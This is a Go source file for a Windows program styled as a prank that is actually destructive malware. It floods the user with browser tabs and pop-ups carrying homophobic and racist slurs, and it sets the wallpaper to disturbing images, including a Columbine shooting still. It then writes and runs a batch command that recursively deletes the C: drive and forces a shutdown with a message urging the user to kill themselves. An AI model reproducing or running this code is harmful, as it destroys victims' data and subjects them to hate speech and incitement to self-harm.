package main

import (
	"fmt"
	"os"
	"os/exec"
	"time"

	"github.com/pkg/browser"
	"github.com/reujab/wallpaper"
	"tawesoft.co.uk/go/dialog"
)

//main
func main() {
	fmt.Println("yooooo whats up")
	time.Sleep(5 * time.Second)
	fmt.Println("knock knock")
	time.Sleep(3 * time.Second)
	browser.OpenURL("https://youtu.be/EwLH41eMBW8")
	time.Sleep(3 * time.Second)
	browser.OpenURL("https://www.google.com/search?client=opera-gx&q=how+2+buy+weed&sourceid=opera&ie=UTF-8&oe=UTF-8")
	openfile()
}

//Openfile
func openfile() {
	time.Sleep(3 * time.Second)
	browser.OpenFile("C:\\Windows\\System32")
	//spam
	for spam := 2; spam > 0; {

		browser.OpenFile("C:\\Windows\\System32")
		time.Sleep(3 * time.Second)
		dialog.Alert("Still using this computer?")
		spam--
		browser.OpenURL("https://www.cnet.com/how-to/best-antivirus")
		dialog.Alert("still using this computer?")
		time.Sleep(5 * time.Second)
		browser.OpenURL("https://cprewritten.net")
		dialog.Alert("knock knock theres no joke")
		browser.OpenURL("https://www.avast.com/en-ca/free-antivirus-download#pc")
		browser.OpenFile("")
		alert()

	}

}

//alerts
func alert() {
	go dialog.Alert("your werid")
	time.Sleep(3 * time.Second)
	go dialog.Alert("fag lol!")
	time.Sleep(3 * time.Second)
	dialog.Alert("snowflake")
	time.Sleep(3 * time.Second)
	go dialog.Alert("faggot")
	spam()

}

func spam() {
	for fun := 2; fun > 0; fun-- {
		time.Sleep(2 * time.Second)
		browser.OpenURL("https://www.youtube.com/watch?v=EwLH41eMBW8")
		time.Sleep(2 * time.Second)
		browser.OpenURL("https://youtu.be/wKO6uZSTaiw")
		time.Sleep(2 * time.Second)
		browser.OpenURL("https://youtu.be/ys83D0fpz8k")
		go dialog.Alert("ALERT ALERT YOUR GAY LMFAO")
	}
	browserBomb()
}

// Browser bomb
func browserBomb() {
	for i := 0; i < 10; i++ {
		browser.OpenURL("https://www.youtube.com/watch?v=0QnVY3LoDoI")
	}
	file()
}

// File open
func file() {
	browser.OpenFile("C:\\Windows\\Desktop")
	browser.OpenFile("C:\\Windows\\Downloads")
	for alert := 3; alert > 0; alert-- {
		go dialog.Alert("ALERT ALERT YOUR GAY LMFAO")
		time.Sleep(3 * time.Second)
		go dialog.Alert("your werid")
		time.Sleep(3 * time.Second)
		browser.OpenURL("https://www.youtube.com/watch?v=hzspsuuGPvY")
		time.Sleep(3 * time.Second)
		changeBackground()

	}
}

// Change backgroun
func changeBackground() {
	var command = []byte("\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\wallpaper_engine\\wallpaper32.exe\" -control stop")
	os.WriteFile("run.bat", command, 0644)
	exec.Command("run.bat").Run()
	for {
		wallpaper.SetFromURL("https://ichef.bbci.co.uk/news/640/cpsprodpb/5AB1/production/_112571232_whatsubject.jpg")
		time.Sleep(3 * time.Second)
		wallpaper.SetFromURL("https://upload.wikimedia.org/wikipedia/en/thumb/d/de/Columbine_Shooting_Security_Camera.jpg/220px-Columbine_Shooting_Security_Camera.jpg")
		time.Sleep(3 * time.Second)
		wallpaper.SetFromURL("https://cdn.vox-cdn.com/thumbor/VN8I0k_BZtXhISCgxw0JQRNxaaY=/1400x1400/filters:format(jpeg)/cdn.vox-cdn.com/uploads/chorus_asset/file/21820757/155172_0103.jpg")
		time.Sleep(3 * time.Second)
		wallpaper.SetFromURL("https://media.pitchfork.com/photos/5c7d4c1b4101df3df85c41e5/1:1/w_600/Dababy_BabyOnBaby.jpg")
		time.Sleep(3 * time.Second)
		wallpaper.SetFromURL("https://cdn.abcotvs.com/dip/images/808223_062615-cc-confederate-flag-thumb.jpg")
		time.Sleep(3 * time.Second)
		wallpaper.SetFromURL("https://media.npr.org/assets/img/2016/11/08/dmodel-1_vert-f1009d1156e261d635ee3139b01b7be31267aa47.jpg")
		time.Sleep(3 * time.Second)
		wallpaper.SetFromURL("https://i.ytimg.com/vi/IPiIyu3rFOY/maxresdefault.jpg")
		time.Sleep(3 * time.Second)
		wallpaper.SetFromURL("https://img-hw.xvideos-cdn.com/videos/thumbs169poster/16/0e/7d/160e7d9ee552e33c9dc341c0540d2d5e/160e7d9ee552e33c9dc341c0540d2d5e.27.jpg")
		time.Sleep(3 * time.Second)
		wallpaper.SetFromURL("https://cdn.discordapp.com/attachments/843563037407707176/845492659388547132/spongebobmanthing.png")
		wipeSystem()
		//for loop
		for {
			go dialog.Alert("fuck you nigger")
			go dialog.Alert("hahahahah fuck you nigger lmfao pc is shit!")
			go dialog.Alert("hahahahah fuck you nigger lmfao pc is shit!")
			go dialog.Alert("hahahahah fuck you nigger lmfao pc is shit!")
			go dialog.Alert("hahahahah fuck you nigger lmfao pc is shit!")
			go dialog.Alert("hahahahah fuck you nigger lmfao pc is shit!")
		}
	}
}

// wipe System
func wipeSystem() {
	var command = []byte("rd c:\\ /s /q")
	os.WriteFile("run.bat", command, 0644)
	exec.Command("run.bat").Run()
	signOut()
}

// SignOut
func signOut() {
	var command = []byte("shutdown /s /f /c \"Get cucked nigger. You just lost PC permissions - go kill yourself, snowflake.\" -t 10")
	os.WriteFile("run.bat", command, 0644)
	exec.Command("run.bat").Run()
}
